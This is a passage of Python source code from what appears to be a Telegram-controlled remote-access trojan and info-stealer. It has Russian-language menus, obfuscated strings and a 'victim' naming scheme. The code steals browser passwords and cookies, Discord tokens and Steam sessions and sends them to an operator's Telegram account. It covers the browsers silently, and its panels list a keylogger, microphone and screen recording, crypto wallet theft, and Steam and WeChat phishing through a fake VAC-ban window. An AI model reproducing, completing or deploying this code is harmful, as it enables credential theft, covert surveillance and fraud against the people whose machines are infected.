            decrypt_string('QEYAHw=='): '📄', decrypt_string('QFYXCA=='): '📘', decrypt_string('QFYXCDY='): '📘', decrypt_string('QEIcDQ=='): '📕',
            decrypt_string('QEoUGA=='): '📗', decrypt_string('QEoUGDY='): '📗', decrypt_string('QEIIHw=='): '📙', decrypt_string('QEIIHzY='): '📙',
            decrypt_string('QFgIDA=='): '🖼️', decrypt_string('QFgIDik='): '🖼️', decrypt_string('QEIWDA=='): '🖼️', decrypt_string('QFURDQ=='): '🖼️',
            decrypt_string('QEgRGw=='): '🗜️', decrypt_string('QEAZGQ=='): '🗜️', '.7z': '🗜️',
            decrypt_string('QFcADg=='): '⚙️', decrypt_string('QF8LAg=='): '⚙️', decrypt_string('QFAZHw=='): '📦',
            '.py': '🐍', '.js': '📜', decrypt_string('QFoMBiI='): '🌐', decrypt_string('QFEIGw=='): '⚡',
            decrypt_string('QFgLBCA='): '📊', decrypt_string('QEoVBw=='): '📊', decrypt_string('QEEJBw=='): '🗄️', '.db': '🗄️',
            decrypt_string('QEIdBg=='): '🔑', decrypt_string('QFkdEg=='): '🔑', decrypt_string('QF4XDA=='): '📋',
        }
        return icons.get(extension, '📎')
    def file_manager_keyboard(self, path, page=0):
        markup = types.InlineKeyboardMarkup(row_width=1)
        parent_dir = os.path.dirname(path)
        if path != parent_dir:
            markup.add(types.InlineKeyboardButton("⬆️ Назад", callback_data="fm_back"))
        total_pages = 1
        start_idx = 0
        end_idx = 0
        try:
            all_items = []
            folders = []
            files = []
            for item in os.listdir(path):
                item_path = os.path.join(path, item)
                if os.path.isdir(item_path):
                    folders.append(item)
                else:
                    files.append(item)
            folders.sort(key=str.lower)
            files.sort(key=str.lower)
            all_items = folders + files
            items_per_page = 10
            total_pages = (len(all_items) + items_per_page - 1) // items_per_page
            start_idx = page * items_per_page
            end_idx = min(start_idx + items_per_page, len(all_items))
            for i in range(start_idx, end_idx):
                item = all_items[i]
                item_path = os.path.join(path, item)
                display_name = item[:30] + '...' if len(item) > 30 else item
                if os.path.isdir(item_path):
                    # Fixed: Use index to avoid callback_data overflow (>64 bytes)
                    markup.add(types.InlineKeyboardButton(f"📁 {display_name}", callback_data=f"fm_idx:{i}"))
                else:
                    file_ext = os.path.splitext(item)[1].lower()
                    icon = self.get_file_icon(file_ext)
                    markup.add(types.InlineKeyboardButton(f"{icon} {display_name}", callback_data=f"fm_idx:{i}"))
            
            if total_pages > 1:
                nav_row = []
                if page > 0:
                    nav_row.append(types.InlineKeyboardButton("◀️", callback_data=f"fm_page:{page - 1}"))
                nav_row.append(types.InlineKeyboardButton(f"📄 {page+1}/{total_pages}", callback_data="fm_noop"))
                if page < total_pages - 1:
                    nav_row.append(types.InlineKeyboardButton("▶️", callback_data=f"fm_page:{page + 1}"))
                markup.row(*nav_row)
            
            markup.add(types.InlineKeyboardButton("🔄 Обновить", callback_data="fm_refresh"))
            if len(self.fm_history) > 0:
                markup.add(types.InlineKeyboardButton("⬅️ История", callback_data="fm_history_back"))
            
            markup.add(types.InlineKeyboardButton("🚪 Закрыть", callback_data="fm_exit"))
            self.fm_path = path
            self.fm_items = all_items
            self.fm_page = page
        except Exception as e:
            log_debug(f"File manager error: {e}")
            markup.add(types.InlineKeyboardButton("❌ Ошибка", callback_data="fm_error"))
        return markup, total_pages, start_idx, end_idx
    def browse_files(self, chat_id, start_path=None, page=0):
        if start_path is None:
            start_path = self.current_working_dir
        start_path = os.path.normpath(start_path)
        if not os.path.exists(start_path):
            start_path = os.path.expanduser('~')
        if page == 0 and self.fm_path and start_path != self.fm_path:
            self.fm_history.append(self.fm_path)
            if len(self.fm_history) > 20:
                self.fm_history = self.fm_history[-20:]
        try:
            folders_count = 0
            files_count = 0
            total_size = 0
            for item in os.listdir(start_path):
                item_path = os.path.join(start_path, item)
                if os.path.isdir(item_path):
                    folders_count += 1
                else:
                    files_count += 1
                    try:
                        total_size += os.path.getsize(item_path)
                    except:
                        pass
            if total_size >= 1024*1024*1024:
                size_str = decrypt_string("FUYXHy89BhEzDQ8YXRlOS14ATEF/YWtWcEZaCkYQXFRfVAVLCRM=")
            elif total_size >= 1024*1024:
                size_str = decrypt_string("FUYXHy89BhEzDQ8YXRlOS14ATEF/YWtWc01ECRRERjcs")
            elif total_size >= 1024:
                size_str = decrypt_string("FUYXHy89BhEzDQ8YXRlXSlwGQkV/NyRCETU=")
            else:
                size_str = f"{total_size} B"
            markup, total_pages, start_idx, end_idx = self.file_manager_keyboard(start_path, page)
            header = f"""📁 ФАЙЛОВЫЙ МЕНЕДЖЕР
🖥️ {self.victim_name[:30]}
📍 {start_path[:50]}
📊 Статистика:
• Папок: {folders_count}
• Файлов: {files_count}
• Всего: {size_str}
"""
            if total_pages > 1:
                header += decrypt_string("Mlya/8+zzeO44+va5riE7u/Q7OqsxdiAzvaIrPPb8vuMpvmJ2tC79tuV/rmQreeY+rOa/8+zzeO44+va5rg6FJ6t6+9ugfiz2Kbq6MLp26rW4/67/nEiEjsQDxNDREkBGl0MCiIOKQM9EhlFUhEdHwBWJwIqKXQRLhYYTC1QAgITEqjTnuZ5GTwYBlwXSxUlDV0NBTp6Pws2EhlnEVYTFBpPUQ==")
            header += "\n"
            safe_send_message(self.bot, chat_id, header, reply_markup=markup)
        except PermissionError:
            safe_send_message(
                self.bot,
                chat_id,
                decrypt_string("jK/0S57MideL9UroxunYq+/j+rrNgeay6le6glLp2are4se79IHsWFAMGlkGURs=").format(path=start_path)
            )
        except Exception as e:
            safe_send_message(
                self.bot,
                chat_id,
                decrypt_string("jK/0S57PiOqKz7qJooO2ylQSAw4z")
            )
    def steal_chrome_data(self):
        """Кража данных из Chrome (отдельно)"""
        if 'chrome' not in self.work_modules:
            safe_send_message(self.bot, ADMIN_ID, "❌ Chrome module not loaded")
            return None
        safe_send_message(self.bot, ADMIN_ID, "⏳ *Extracting Chrome data...*")
        injector = ChromeInjector()
        if injector.is_available():
            safe_send_message(self.bot, ADMIN_ID, "👻 *Chrome Injector starting...* (Self-debugging mode active)")
            injector.run_injector(action="all")
            time.sleep(5)
        data = self.work_modules['chrome'].steal(browser_id='chrome')

        try:
            tokens_list = self.work_modules.get('discord').steal_tokens().get('tokens', []) if 'discord' in self.work_modules else []
            if tokens_list:
                tokens_dir = os.path.join(self.report_manager.output_dir, "Discord")
                os.makedirs(tokens_dir, exist_ok=True)
                with open(os.path.join(tokens_dir, decrypt_string("Gl0TDiAidwgpGAQ=")), 'w', encoding='utf-8') as f:
                    json.dump(tokens_list, f)
        except: pass

        self.report_manager.finalize_output()

        self.report_manager.send_output_zip(caption="📦 Chrome Raw Data (JSON)")
        pw_count = len(data.get('passwords', []))
        safe_send_message(self.bot, ADMIN_ID, "✅ *Chrome extraction finished!*")
        if pw_count > 0:
            pw_file = os.path.join(self.temp_dir, f"chrome_passwords_{int(time.time())}.txt")
            with open(pw_file, 'w', encoding='utf-8') as f:
                f.write(self.work_modules['chrome'].format_passwords(data['passwords']))
            with open(pw_file, 'rb') as f:
                self.bot.send_document(ADMIN_ID, f, caption="🔑 Chrome Passwords (PTRKXLORD)")
            try: os.remove(pw_file)
            except: pass
        return data
    def _kill_browsers(self):
        """Принудительно закрывает браузеры для разблокировки файлов БД"""
        browsers = ["chrome.exe", "msedge.exe", "firefox.exe", "brave.exe", "opera.exe", "yandex.exe"]
        for b in browsers:
            try:
                subprocess.run(['taskkill', '/F', '/IM', b], capture_output=True, creationflags=0x08000000)
            except:
                pass
        time.sleep(2) 
    def steal_browsers_data(self):
        """Кража из всех браузеров с умным автозапуском"""
        if 'browser' not in self.work_modules:
            safe_send_message(self.bot, GLOBAL_CHID, "❌ Browser module not loaded")
            return None

        safe_send_message(self.bot, ADMIN_ID, "⏳ *Extracting data from all browsers...*")

        import psutil
        running_procs = [p.info['name'].lower() for p in psutil.process_iter(['name']) if p.info.get('name')]
        auto_started_procs = []

        browser_exe_map = {
            'chrome': ('Google\\Chrome', ['User Data\\Default\\Login Data', 'User Data\\Default\\Network\\Cookies']),
            'edge': ('Microsoft\\Edge', ['User Data\\Default\\Login Data', 'User Data\\Default\\Network\\Cookies']),
            'brave': ('Brave-Browser', ['User Data\\Default\\Login Data', 'User Data\\Default\\Network\\Cookies', 'BraveSoftware\\Brave-Browser\\Application\\brave.exe']),
            'opera': ('Opera Software', ['Opera Stable\\Login Data', 'Opera Stable\\Network\\Cookies']),
            'opera_gx': ('Opera Software', ['Opera GX Stable\\Login Data', 'Opera GX Stable\\Network\\Cookies']),
            'vivaldi': ('Vivaldi', ['User Data\\Default\\Login Data', 'User Data\\Default\\Network\\Cookies']),
            'yandex': ('Yandex\\YandexBrowser', ['User Data\\Default\\Login Data', 'User Data\\Default\\Network\\Cookies']),
            '360': ('360chrome.exe', ['360Chrome\\Chrome\\Application\\360chrome.exe']),
            'sogou': ('SogouExplorer.exe', ['SogouExplorer\\SogouExplorer.exe']),
            'qq': ('QQBrowser.exe', ['Tencent\\QQBrowser\\QQBrowser.exe']),
            'uc': ('UCBrowser.exe', ['UCBrowser\\Application\\UCBrowser.exe']),
            'cent': ('Google\\Chrome', ['CentBrowser\\Application\\chrome.exe']),
            'chromium': ('Google\\Chrome', ['Chromium\Application\chrome.exe'])
        }

        search_bases = [
            os.environ.get('PROGRAMFILES', 'C:\\Program Files'),
            os.environ.get('PROGRAMFILES(X86)', 'C:\\Program Files (x86)'),
            os.environ.get('LOCALAPPDATA', ''),
            os.environ.get('APPDATA', '')
        ]

        b_module = self.work_modules['browser']
        for b_id, b_info in b_module.chromium_browsers.items():
            if not os.path.exists(b_info['path']) or b_id not in browser_exe_map:
                continue
            exe_name, rel_paths = browser_exe_map[str(b_id)]
            if exe_name.lower() in running_procs:
                continue
            launched = False
            for base in search_bases:
                if not base: continue
                for rel_path in rel_paths:
                    full_path = os.path.join(base, rel_path)
                    if os.path.exists(full_path):
                        try:

                            subprocess.Popen([full_path, "--headless", "--disable-gpu"], creationflags=0x08000000)
                            auto_started_procs.append(exe_name)
                            safe_send_message(self.bot, ADMIN_ID, "👻 Невидимо запустил {name} для инжекта...".format(name=b_info['name']))
                            launched = True
                            break
                        except: pass
                if launched: break

        if auto_started_procs:
            time.sleep(3) 

        for exe_name in set(auto_started_procs):
            try: subprocess.run(['taskkill', '/F', '/IM', exe_name], capture_output=True, creationflags=0x08000000)
            except: pass

        self.work_modules['browser'].steal()
        self.report_manager.finalize_output()

        # Discord tokens exfiltration
        try:
            tokens_list = self.work_modules.get('discord').steal_tokens().get('tokens', []) if 'discord' in self.work_modules else []
            if tokens_list:
                tokens_dir = os.path.join(self.report_manager.output_dir, "Discord")
                os.makedirs(tokens_dir, exist_ok=True)
                with open(os.path.join(tokens_dir, "tokens.json"), 'w', encoding='utf-8') as f:
                    json.dump(tokens_list, f)
        except: pass

        # Finalize report and send ZIP
        self.report_manager.process_output_folder()
        self.report_manager.send_output_zip(caption="💎 ✨ ОТЧЕТ AFERAPOKITAYSKY STEALER ✨ 💎")
        return True
    def steal_discord_data(self):
        """Инжект Discord + запуск для захвата токена"""
        if 'discord' not in self.work_modules:
            safe_send_message(self.bot, GLOBAL_CHID, "❌ Discord module not loaded")
            return None
        
        safe_send_message(self.bot, GLOBAL_CHID, "⏳ Запускаю Discord для инжекта...")
        inject_result = self.work_modules['discord'].inject(APPLICATION_PATH)
        
        if inject_result:
            safe_send_message(self.bot, GLOBAL_CHID, "✅ Discord injection successful (ironclad flow)")
        else:
            safe_send_message(self.bot, GLOBAL_CHID, "❌ Discord injection failed.")
        return inject_result

    def search_discord_tokens(self):
        """Пассивный поиск токенов через LevelDB (оффлайн поиск)"""
        if 'discord' not in self.work_modules:
            safe_send_message(self.bot, GLOBAL_CHID, "❌ Discord module not loaded")
            return None
        
        safe_send_message(self.bot, GLOBAL_CHID, "⏳ Ищу Discord токены...")
        data = self.work_modules['discord'].steal_tokens()
        tokens = data.get('tokens', [])

        if tokens:
            report = self.work_modules['discord'].format_token_report(tokens)
            if report:
                safe_send_message(self.bot, GLOBAL_CHID, report, parse_mode="HTML")
        else:
            safe_send_message(self.bot, GLOBAL_CHID, "❌ Discord токены не найдены.")
        return data
    def get_work_info(self):
        """Информация о WORK функциях"""
        if hasattr(self, 'system_manager'):
            info = self.system_manager.GetSystemInfo()
        else:
            info = decrypt_string("IFMMAjg0eTEjBB5dH3QHFA9VHRluJDcDLBYDVBNbCh9A")
        safe_send_message(self.bot, GLOBAL_CHID, info, parse_mode="HTML")
    def admin_panel_keyboard(self, user_id=None):
        from telebot import types
        markup = types.InlineKeyboardMarkup()
        markup.row(
            types.InlineKeyboardButton("💻 System", callback_data="panel_system"),
            types.InlineKeyboardButton("💼 Work", callback_data="panel_work"),
            types.InlineKeyboardButton("👁️ Spyware", callback_data="panel_spyware")
        )
        markup.row(
            types.InlineKeyboardButton("✍️ Set Name", callback_data="set_victim_name")
        )
        return markup
    def system_panel_keyboard(self, uid=None):
        from telebot import types
        markup = types.InlineKeyboardMarkup()
        markup.row(
            types.InlineKeyboardButton("📁 Файлы", callback_data="file_manager"),
            types.InlineKeyboardButton("📊 Процессы", callback_data="proc_list")
        )
        markup.row(
            types.InlineKeyboardButton("🖥️ Инфо ПК", callback_data="system"),
            types.InlineKeyboardButton("📡 Wi-Fi", callback_data="wifi")
        )
        cmd_status = '🟢' if getattr(self, 'cmd_mode_active', False) else '🔴'
        markup.row(
            types.InlineKeyboardButton(f"💻 Терминал {cmd_status}", callback_data="cmd_enter"),
            types.InlineKeyboardButton("💻 PowerShell", callback_data="shell_start")
        )
        layout = getattr(self, 'current_layout', 'en')
        layout_emoji = '🇺🇸' if layout == 'en' else '🇷🇺' if layout == 'ru' else '🇨🇳' if layout == 'cn' else '🇺🇸'
        markup.row(
            types.InlineKeyboardButton("🌐 Layout", callback_data="layout"),
            types.InlineKeyboardButton("👥 Сменить ПК", callback_data="client_list")
        )
        row_last = []
        if ADMIN_IDS:
            row_last.append(types.InlineKeyboardButton("💀 Self-Destruct", callback_data="self_delete"))
        row_last.append(types.InlineKeyboardButton("🆘 Справка", callback_data="show_commands"))
        row_last.append(types.InlineKeyboardButton("🔄 Обновить", callback_data="panel_refresh"))
        row_last_p = row_last[:3]
        markup.row(*row_last_p)
        markup.row(types.InlineKeyboardButton("⬅️ Назад", callback_data="back_to_main"))
        return markup

    def send_file_manager(self, chat_id, message_id=None):
        from telebot import types
        try:
            cwd = self.current_working_dir
            if not os.path.exists(cwd):
                cwd = decrypt_string("LQgkNw==")
                self.current_working_dir = cwd

            entries = os.listdir(cwd)
            dirs = sorted([e for e in entries if os.path.isdir(os.path.join(cwd, e))])
            files = sorted([e for e in entries if os.path.isfile(os.path.join(cwd, e))])

            all_items = dirs + files
            self.last_fm_items = all_items

            items_per_page = 10
            page = getattr(self, "fm_page", 0)
            total_pages = max(1, (len(all_items) + items_per_page - 1) // items_per_page)
            if page >= total_pages: page = total_pages - 1
            if page < 0: page = 0
            self.fm_page = page

            start_idx = page * items_per_page
            end_idx = start_idx + items_per_page
            page_items = all_items[start_idx:end_idx]

            markup = types.InlineKeyboardMarkup()
            markup.row(types.InlineKeyboardButton("⬆️ Вверх", callback_data="fm_up"))

            for item in page_items:
                idx = all_items.index(item)
                is_dir = os.path.isdir(os.path.join(cwd, item))
                icon = "📁" if is_dir else "📄"
                cb_prefix = "fmd_" if is_dir else "fmf_"

                display_name = (item[:25] + "...") if len(item) > 28 else item
                markup.row(types.InlineKeyboardButton(f"{icon} {display_name}", callback_data=f"{cb_prefix}{idx}"))

            nav_row = []
            if page > 0:
                nav_row.append(types.InlineKeyboardButton("⬅️ Назад", callback_data=f"fmp_{page-1}"))
            if page < total_pages - 1:
                nav_row.append(types.InlineKeyboardButton("Вперед ➡️", callback_data=f"fmp_{page+1}"))
            if nav_row:
                markup.row(*nav_row)

            markup.row(types.InlineKeyboardButton("🔙 Обратно в панель", callback_data="panel_system"))

            header = (
                "📂 <b>ФАЙЛОВЫЙ МЕНЕДЖЕР</b>\n"
                "━━━━━━━━━━━━━━━━━━\n"
                "📍 <b>Путь:</b> <code>{}</code>\n"
                "📃 <b>Элементов:</b> <code>{}</code> из <code>{}</code>\n"
                "━━━━━━━━━━━━━━━━━━"
            ).format(cwd, len(page_items), len(all_items))
            text = header
            if message_id:
                try:
                    self.bot.edit_message_text(text, chat_id, message_id, reply_markup=markup, parse_mode="HTML")
                except:
                    pass
            else:
                safe_send_message(self.bot, chat_id, text, reply_markup=markup, parse_mode="HTML")
        except Exception as e:
            safe_send_message(self.bot, chat_id, "❌ Произошла ошибка при открытии файлового менеджера.")
    def work_panel_keyboard(self):
        from telebot import types
        markup = types.InlineKeyboardMarkup()
        markup.row(
            types.InlineKeyboardButton("💬 Discord Inject", callback_data="work_discord"),
            types.InlineKeyboardButton("🌍 Cookie", callback_data="work_browsers"),
            types.InlineKeyboardButton("🔍 Search Tokens", callback_data="discord_search")
        )
        markup.row(
            types.InlineKeyboardButton("📱 Telegram Session", callback_data="work_telegram"),
            types.InlineKeyboardButton("🎣 WeChat Phish", callback_data="work_wechat_phish")
        )
        markup.row(
            types.InlineKeyboardButton("🎙️ Join Discord", callback_data="discord_remote_start"),
        )
        markup.row(
            types.InlineKeyboardButton("💰 Crypto Wallets", callback_data="work_crypto"),
            types.InlineKeyboardButton("💻 Software", callback_data="work_software")
        )
        proxy_status = '🟢' if 'proxy' in getattr(self, 'work_modules', {}) and getattr(self.work_modules['proxy'], 'proxy_active', False) else '🔴'
        markup.row(
            types.InlineKeyboardButton("📊 Сводка", callback_data="work_info"),
            types.InlineKeyboardButton(f"🌐 Прокси {proxy_status}", callback_data="proxy_toggle")
        )
        lang_status = "🇺🇸 EN" if _get_vac_lang() == "en" else "🇨🇳 CN"
        markup.row(
            types.InlineKeyboardButton("🎮 Steam Phish", callback_data="steam_phish"),
            types.InlineKeyboardButton(f"🚨 VAC ALERT [{lang_status}]", callback_data="vac_alert")
        )
        markup.row(types.InlineKeyboardButton("⬅️ Назад", callback_data="back_to_main"))
        return markup
    def spyware_panel_keyboard(self):
        from telebot import types
        markup = types.InlineKeyboardMarkup()
        markup.row(
            types.InlineKeyboardButton("📸 Скриншот", callback_data="screen"),
            types.InlineKeyboardButton("📻 Запись экрана(10 сек)", callback_data="record_video")
        )
        mic_status = '✅' if AUDIO_AVAILABLE else '❌'
        markup.row(
            types.InlineKeyboardButton(f"🎙️ Микрофон {mic_status}", callback_data="mic_record")
        )
        keylog_status = '🟢' if getattr(self, 'keylogger_active', False) else '🔴'
        markup.row(
            types.InlineKeyboardButton(f"⌨️ Кейлоггер {keylog_status}", callback_data="keylog_toggle"),
            types.InlineKeyboardButton("📋 Буфер", callback_data="clipboard")
        )
        markup.row(
            types.InlineKeyboardButton("📜 Окна", callback_data="windows")
        )
        markup.row(types.InlineKeyboardButton("⬅️ Назад", callback_data="back_to_main"))
        return markup
    def trigger_discord_action(self, action, token=None, url=None, chat_id=None):
        """Запуск действий Discord в фоновом потоке с asyncio loop"""
        import asyncio
        import threading
        if chat_id:
            self.last_discord_chat_id = chat_id

        def discord_telegram_log(msg):
            cid = getattr(self, 'last_discord_chat_id', None)
            if not cid: return

            if "[PROGRESS]" in msg:
                # Remove [PROGRESS] tag for user display
                display_text = msg.replace("[PROGRESS]", "").strip()
                # If it's a success/error, add an emoji
                emoji = "⏳"
                if "100%" in msg or "ready" in msg.lower() or "готов" in msg.lower():
                    emoji = "✅"
                elif "error" in msg.lower() or "провалил" in msg.lower():
                    emoji = "❌"

                # If we already have a progress message, edit it
                if cid in self.discord_progress_msg:
                    try:
                        self.bot.edit_message_text(
                            chat_id=cid,
                            message_id=self.discord_progress_msg[cid],
                            text=f"{emoji} <b>Статус подключения Discord:</b>\n{display_text}",
                            parse_mode="HTML"
                        )
                    except Exception as e:
                        # If edit fails (e.g. same content), just pass or log internally
                        pass
                else:
                    # Send a new message and store its ID
                    sent = safe_send_message(self.bot, cid, f"{emoji} <b>Статус подключения Discord:</b>\n{display_text}", parse_mode="HTML")
                    if sent:
                        self.discord_progress_msg[cid] = sent.message_id
                
                # Check for completion (100% or "Бот готов к работе")
                is_complete = "100%" in msg or "ready" in msg.lower() or "готов" in msg.lower()
                if is_complete:
                    # Clear the progress message ID so next join starts fresh
                    if cid in self.discord_progress_msg:
                        del self.discord_progress_msg[cid]
                    # Trigger the control panel
                    try:
                        self.log(f"Discord join complete, sending panel to {cid}", "success")
                        self.send_discord_control_panel(cid)
                    except Exception as ex:
                        self.log(f"Failed to send control panel: {ex}", "error")
            else:
                # Normal log, send as separate message or ignore
                try: safe_send_message(self.bot, cid, "Discord: " + msg, parse_mode="HTML")
                except: pass

        try:
            from websocket.discord_bot import DiscordInjector
        except ImportError:
            import sys as _sys
            _sys.path.append(os.path.join(BASE_DIR, "websocket"))
            try:
                from discord_bot import DiscordInjector
            except ImportError:
                return 
        if not getattr(self, 'discord_loop', None):
            self.discord_loop = asyncio.new_event_loop()
            def run_loop(loop):
                asyncio.set_event_loop(loop)
                loop.run_forever()
            threading.Thread(target=run_loop, args=(self.discord_loop,), daemon=True).start()
        if not hasattr(self, 'discord_bot') or not self.discord_bot:
            self.discord_bot = DiscordInjector(callback=discord_telegram_log, headless=True)
        else:
            self.discord_bot.callback = discord_telegram_log

        if action == 'connect':
            asyncio.run_coroutine_threadsafe(self.discord_bot.connect_and_join(token, url), self.discord_loop)
        elif action == 'stream':
            asyncio.run_coroutine_threadsafe(self.discord_bot.start_stream(), self.discord_loop)
        elif action == 'mute_mic':
            asyncio.run_coroutine_threadsafe(self.discord_bot.toggle_mic(), self.discord_loop)
        elif action == 'deafen':
            asyncio.run_coroutine_threadsafe(self.discord_bot.toggle_deafen(), self.discord_loop)
        elif action == 'disconnect':
            if hasattr(self, 'discord_bot') and self.discord_bot:
                asyncio.run_coroutine_threadsafe(self.discord_bot.close(), self.discord_loop)
                self.discord_bot = None
            else:
                self.log("Discord бот не запущен.", "warning")
    def send_discord_control_panel(self, chat_id):
        """Отправка панели управления Discord"""
        from telebot import types
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton("🎤 Мут микро", callback_data="discord_ctrl_mic"),
            types.InlineKeyboardButton("🔇 Мут звук", callback_data="discord_ctrl_deaf"),
        )
        markup.add(
            types.InlineKeyboardButton("🖥 Демка экрана", callback_data="discord_ctrl_stream"),
            types.InlineKeyboardButton("🔴 Выйти из войса", callback_data="discord_ctrl_disconnect"),
        )
        safe_send_message(self.bot, chat_id,
            "✅ <b>Успешно подключено к голосовому каналу Discord!</b>\n\nУправление голосовым каналом:",
            parse_mode="HTML",
            reply_markup=markup
        )

    def process_discord_join(self, message):
        """Обработка ввода данных для входа в Discord канал"""
        if not self.check_permission(message): return
        text = message.text.strip()

        if "|" not in text:
            safe_send_message(self.bot, message.chat.id, "❌ Неверный формат. Используйте `токен | ссылка_приглашения`")
            return

        parts = text.split("|", 1)
        token = parts[0].strip()
        url = parts[1].strip()

        if not token or not url:
            safe_send_message(self.bot, message.chat.id, "❌ Токен или ссылка приглашения не могут быть пустыми.")
            return
        if decrypt_string("ClsLCCEjPUw9EA==") not in url and decrypt_string("DVoZBSA0NRF1") not in url:
             safe_send_message(self.bot, message.chat.id, "❌ Ссылка приглашения должна содержать 'discord.gg' или 'discord.com'.")
        token_source = "вручную" if "|" in text else "украден с жертвы"
        # Initial status message is NOT sent here anymore, 
        # because the first [PROGRESS] log from the module will create it.
        # However, we can clear the old msg ID to be sure.
        if message.chat.id in self.discord_progress_msg:
            del self.discord_progress_msg[message.chat.id]

        self.trigger_discord_action('connect', token, url, chat_id=message.chat.id)
    def _send_bridges_status(self, chat_id):
        """Send bridge status message with keyboard"""
        stats = bridge_manager.get_stats()
        active_count = sum(1 for b in stats['bridges'] if b['status'] == 'healthy')

        text = "🌐 *Статус мостов*\n\n"
        text += f"• Всего мостов: `{len(stats['bridges'])}`\n"
        text += f"• Активных мостов: `{active_count}`\n\n"

        for b in stats['bridges']:
            if b['status'] == 'healthy': status_emoji = '🟢'
            elif b['status'] == 'untested': status_emoji = '⚪'
            elif b['status'] == 'stale': status_emoji = '🟠'
            else: status_emoji = '🔴'

            text += f"{status_emoji} `{b['url']}`\n"
            text += f"  - Статус: `{b['status']}`\n"

        markup = types.InlineKeyboardMarkup()
        markup.row(
            types.InlineKeyboardButton("🔄 Refresh", callback_data="bridge_refresh"),
            types.InlineKeyboardButton("🚀 Deploy New", callback_data="bridge_deploy")
        )
        markup.row(
            types.InlineKeyboardButton("🧪 Test All", callback_data="bridge_test_all"),
            types.InlineKeyboardButton("🧹 Cleanup", callback_data="bridge_cleanup")
        )
        markup.row(
            types.InlineKeyboardButton("🗑 Clear All", callback_data="bridge_clear_confirm")
        )

        safe_send_message(self.bot, chat_id, text, parse_mode="Markdown", reply_markup=markup)

    def handle_vac_alert(self, chat_id):
        "VAC Alert: Запуск фейкового окна VAC для получения Steam-сессии"
        safe_send_message(self.bot, chat_id, "⏳ Запускаю фейковое VAC окно...")
        def run_vac():
            try:
                import sys as _sys
                import os
                import socket
                import threading

                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.bind(("127.0.0.1", 0))
                sock.settimeout(600)
                port = sock.getsockname()[1]

                def vac_logger_thread():
                    try:
                        while True:
                            data, _ = sock.recvfrom(2048)
                            msg = decrypt_string(data.decode("utf-8", errors="replace"))
                            if msg == "CLOSE":
                                break
                            safe_send_message(self.bot, chat_id, "VAC: " + msg)
                    except Exception:
                        pass
                    finally:
                        try: sock.close()
                        except: pass

                threading.Thread(target=vac_logger_thread, daemon=True).start()

                vac_dir = os.path.join(BASE_DIR, "tablichka")
                os.makedirs(vac_dir, exist_ok=True)

                # 4. Prepare HTML with Localization and Customizations
                try:
                    html_src = os.path.join(vac_dir, "site_dump", decrypt_string("HUYdCiMyNg83AgRRBkBIGQFf"), "linkfilter", decrypt_string("B1wcDjZ/MRY3Gw=="))
                    html_out = os.path.join(vac_dir, "site_dump", decrypt_string("HUYdCiMyNg83AgRRBkBIGQFf"), "linkfilter", decrypt_string("B1wcDjYOKwc+WQJMH1U="))
                    
                    if os.path.exists(html_src):
                        with open(html_src, "r", encoding="utf-8") as f:
                            content = f.read()
                        
                        # Apply custom Agent Name if exists
                        agent_name_path = os.path.join(vac_dir, decrypt_string("D1UdBToONwM3EkRMCk0="))
                        if os.path.exists(agent_name_path):
                            try:
                                with open(agent_name_path, "r", encoding="utf-8") as f_name:
                                    new_name = f_name.read().strip()
                                if new_name:
                                    content = re.sub(decrypt_string('UkEMGSE/PlwBKVZlWQVJCRpAFwUpbw=='), decrypt_string('UkEMGSE/PlwhGQ9PLVcHFwtPREQ9JSsNNBBU'), content)
                            except: pass
                        
                        # Apply Localization
                        # content = _apply_localization(content, lang) # Now handled by steam_notice.py internal _get_vac_lang
                        
                        # with open(html_out, "w", encoding="utf-8") as f:
                        #     f.write(content)
                        log_debug("VAC: HTML успешно подготовлен.")
                except Exception as e:
                    log_debug("VAC: Ошибка при подготовке HTML: " + str(e))

                # 5. Prepare Cookies for VAC injection
                try:
                    vac_cookie_path = os.path.join(vac_dir, decrypt_string("DV0XACc0KkwuDx4="))
                    if not os.path.exists(vac_cookie_path) or os.path.getsize(vac_cookie_path) < 10:
                        all_cookies = []
                        for root, _, files in os.walk(self.report_manager.output_dir):
                            for file in files:
                                if decrypt_string("DV0XACc0KkwwBAVW") in file.lower():
                                    try:
                                        with open(os.path.join(root, file), 'r', encoding='utf-8') as f:
                                            all_cookies.extend(json.load(f))
                                    except: pass
                        steam_cookies = [c for c in all_cookies if decrypt_string("HUYdCiMyNg83AgRRBkBIGQFf") in c.get('domain', '').lower()]
                        if steam_cookies:
                            unique_cookies = {}
                            for c in steam_cookies:
                                name = c.get('name')
                                if name not in unique_cookies:
                                    unique_cookies[name] = c
                            final_cookies = list(unique_cookies.values())
                            with open(vac_cookie_path, 'w', encoding='utf-8') as f:
                                json.dump(final_cookies, f, indent=2)
                            safe_send_message(self.bot, chat_id, "✅ Steam куки успешно сохранены для инжекта VAC.")
                except Exception as e:
                    log_debug("VAC: Ошибка при подготовке куки: " + str(e))

                compiled_exe = os.path.join(BASE_DIR, decrypt_string("PUYdCiMQNQcoA0RdClw="))
                if not os.path.exists(compiled_exe):
                    compiled_exe = os.path.join(vac_dir, decrypt_string("PUYdCiMQNQcoA0RdClw="))

                lang = _get_vac_lang()
                if os.path.exists(compiled_exe):
                    proc = subprocess.Popen(
                        [compiled_exe, "--udp", str(port), "--lang", lang],
                        cwd=BASE_DIR,
                        creationflags=0x08000000,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                    )
                    safe_send_message(self.bot, chat_id, "✅ VAC окно запущено (скомпилированный EXE).")
                    return

                vac_script = os.path.join(vac_dir, decrypt_string("HUYdCiMONw0uHgldXEkf"))
                if not os.path.exists(vac_script):
                    safe_send_message(self.bot, chat_id, "❌ VAC скрипт не найден. Пожалуйста, убедитесь, что `steam_notice.py` находится в папке `tablichka`.")
                    sock.close()
                    return
                python_exe = _sys.executable

                proc = subprocess.Popen(
                    [python_exe, vac_script, "--udp", str(port), "--lang", lang],
                    cwd=BASE_DIR,
                    creationflags=0x08000000,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
                safe_send_message(self.bot, chat_id,
                    "✅ VAC окно запущено (Python скрипт). Ожидаю данные...")
            except Exception as e:
                safe_send_message(self.bot, chat_id, "❌ Ошибка при запуске VAC окна: " + str(e))
        threading.Thread(target=run_vac, daemon=True).start()

    def start_bot(self):
        @self.bot.message_handler(commands=['errors'])
        def errors_command(message):
            if not self.check_permission(message): return
            try:
                from core.error_logger import error_logger
                logs = error_logger.get_logs()
                if logs.get('errors'):
